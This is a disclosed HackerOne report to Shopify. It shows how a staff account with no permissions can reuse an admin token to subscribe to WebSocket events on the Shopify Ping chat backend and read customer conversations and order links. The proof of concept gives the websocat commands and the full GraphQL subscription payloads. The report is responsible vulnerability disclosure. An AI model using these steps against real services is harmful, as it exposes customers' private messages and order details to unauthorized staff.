# Staff with no permissions can listen to Shopify Ping conversations by registering to its different WebSocket Events

## Report Details
- **Report ID**: 1023669
- **URL**: https://hackerone.com/reports/1023669
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2020-10-31T23:47:39.541Z
- **Disclosed**: 2020-11-19T20:11:37.668Z

## Reporter
- **Username**: imgnotfound
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
By registering to a few different Shopify Ping Websocket Events on the `wss://argus.shopifycloud.com/graphql?shop_id={id}` endpoint, a staff without any permission can listen to conversions with customers.

## Steps to reproduce
1. With a staff that doesn't have any permissions, login into the shop admin at `https://{shop}.myshopify.com/admin`
1. Within your browser, open the Network inspection tab and copy the **argus token** value from the response of the **GetToken** operation that is being sent to `https://{shop}.myshopify.com/admin/internal/web/graphql/core`
1. Using **websocat** command line tool or any other WebSocket client:

Open a connection
 ```
websocat "wss://argus.shopifycloud.com/graphql?shop_id={id}"
 ```

Send the authorization request by taking care of replacing the `{token}` with the actual value from **Step 2**
 ```
{"type":"connection_init","payload":{"Authorization":"{token}"}}
```

Register to different Events
```
{"id":"1","type":"start","payload":{"variables":{"eventName":"conversation"},"extensions":{},"operationName":"EventSubscription","query":"subscription EventSubscription($eventName: String!) {\n  eventReceived(eventName: $eventName) {\n    eventName\n    shopId\n    eventTimestamp\n    eventUuid\n    eventId\n    eventScope\n    eventSerialGroup\n    eventSerialId\n    eventSourceApp\n    eventSourceHost\n    internalSessionId\n    remoteIp\n    requestId\n    schemaVersion\n    userId\n    payload\n    __typename\n  }\n}\n"}}
```

```
{"id":"2","type":"start","payload":{"variables":{"eventName":"message_status"},"extensions":{},"operationName":"EventSubscription","query":"subscription EventSubscription($eventName: String!) {\n  eventReceived(eventName: $eventName) {\n    eventName\n    shopId\n    eventTimestamp\n    eventUuid\n    eventId\n    eventScope\n    eventSerialGroup\n    eventSerialId\n    eventSourceApp\n    eventSourceHost\n    internalSessionId\n    remoteIp\n    requestId\n    schemaVersion\n    userId\n    payload\n    __typename\n  }\n}\n"}}
```

```
{"id":"3","type":"start","payload":{"variables":{"eventName":"message"},"extensions":{},"operationName":"EventSubscription","query":"subscription EventSubscription($eventName: String!) {\n  eventReceived(eventName: $eventName) {\n    eventName\n    shopId\n    eventTimestamp\n    eventUuid\n    eventId\n    eventScope\n    eventSerialGroup\n    eventSerialId\n    eventSourceApp\n    eventSourceHost\n    internalSessionId\n    remoteIp\n    requestId\n    schemaVersion\n    userId\n    payload\n    __typename\n  }\n}\n"}}
```

```
{"id":"4","type":"start","payload":{"variables":{"eventName":"participant"},"extensions":{},"operationName":"EventSubscription","query":"subscription EventSubscription($eventName: String!) {\n  eventReceived(eventName: $eventName) {\n    eventName\n    shopId\n    eventTimestamp\n    eventUuid\n    eventId\n    eventScope\n    eventSerialGroup\n    eventSerialId\n    eventSourceApp\n    eventSourceHost\n    internalSessionId\n    remoteIp\n    requestId\n    schemaVersion\n    userId\n    payload\n    __typename\n  }\n}\n"}}
```
```
{"id":"5","type":"start","payload":{"variables":{"eventName":"read_state"},"extensions":{},"operationName":"EventSubscription","query":"subscription EventSubscription($eventName: String!) {\n  eventReceived(eventName: $eventName) {\n    eventName\n    shopId\n    eventTimestamp\n    eventUuid\n    eventId\n    eventScope\n    eventSerialGroup\n    eventSerialId\n    eventSourceApp\n    eventSourceHost\n    internalSessionId\n    remoteIp\n    requestId\n    schemaVersion\n    userId\n    payload\n    __typename\n  }\n}\n"}}
```
 
4.Using your browser in Incognito, create a new Shopify Chat discussion by opening `https://{shop}.myshopify.com/?chat` and proceed with a customer order lookup operation
 5.In your command line, observe that you'll be receiving any messages from that conversion along with the customer order status page link

## Demo
███████

## Impact

A staff without any permissions can listen to ongoing Shopify Ping conversions and therefore get access to some customer details and order informations.

## Attachments
No attachments
